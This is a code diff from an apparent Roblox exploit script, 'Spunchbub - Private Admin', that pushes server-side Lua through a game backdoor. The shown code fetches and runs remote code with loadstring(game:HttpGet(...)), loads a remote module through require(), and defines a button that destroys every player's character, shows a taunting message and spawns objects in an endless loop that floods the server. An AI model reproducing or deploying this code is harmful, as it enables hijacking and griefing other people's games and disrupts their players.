@@ -1336,7 +1336,6 @@ Players.PlayerAdded:Connect(function(player)
 end)
 ]])
 
-fireRemoteEvent([[
 	local library = loadstring(game:HttpGet("https://raw.githubusercontent.com/systemzyx/betterlibs/refs/heads/main/betteruilib.lua"))()
 	local CommandsMenu = library:Window("Spunchbub - Private Admin")
 	
@@ -1615,7 +1614,6 @@ fireRemoteEvent([[
 	CommandsMenu:Button("EL MAXWELL!!", function()
 			fireRemoteEvent('local s=Instance.new("Sound",workspace)s.Name="EL GATO or MASWELL"s.SoundId="rbxassetid://104483584177040"s:Play()s.Looped=true repeat wait(0.01) until s.IsLoaded==true wait(2)local d=Instance.new("DistortionSoundEffect",s)d.Level=0.8 local sky=Instance.new("Sky",game:GetService("Lighting"))sky.SkyboxBk="http://www.roblox.com/asset/?id=4575171289"sky.SkyboxFt="http://www.roblox.com/asset/?id=4575171289"sky.SkyboxLf="http://www.roblox.com/asset/?id=4575171289"sky.SkyboxRt="http://www.roblox.com/asset/?id=4575171289"sky.SkyboxUp="http://www.roblox.com/asset/?id=4575171289"sky.SkyboxDn="http://www.roblox.com/asset/?id=4575171289"sky.CelestialBodiesShown=false sky.StarCount=999999999999999999 for _,p in ipairs(game:GetService("Players"):GetPlayers())do if p.Character then p.Character:Destroy()end end local l=game:GetService("Lighting")l.FogEnd=1000 l.FogStart=900 l.FogColor=Color3.new(math.random(),math.random(),math.random()) local m=Instance.new("Message",workspace)m.Text="oooo nice computer you got there can i have it" local t=game:FindFirstChild("Teams")if t then t:ClearAllChildren()end while true do wait(0.01) if t then local tm=Instance.new("Team",t)tm.Name="maxwell real?!?"..tostring(math.random(1,33373))tm.TeamColor=BrickColor.Random()end for i=1,15 do local c=Instance.new("Part",workspace)local ms=Instance.new("SpecialMesh",c)ms.MeshType=Enum.MeshType.FileMesh ms.MeshId="rbxassetid://4934166503"ms.TextureId="rbxassetid://4934166532"c.Touched:Connect(function(o)o:Destroy()end)c.Size=Vector3.new(6.502,11.339,14.281)c.CFrame=CFrame.new(math.random(-1000,1000),math.random(-1000,1000),math.random(-1000,1000))end end')
 	end)
-]])
 
 fireRemoteEvent('require(3986243232).load("spunchbub anti skid",{"' .. game.Players.LocalPlayer.Name ..  '"})')
         notify.Info("Spunchbub","Backdoor found! Implemented backdoor protection & anti skid.")
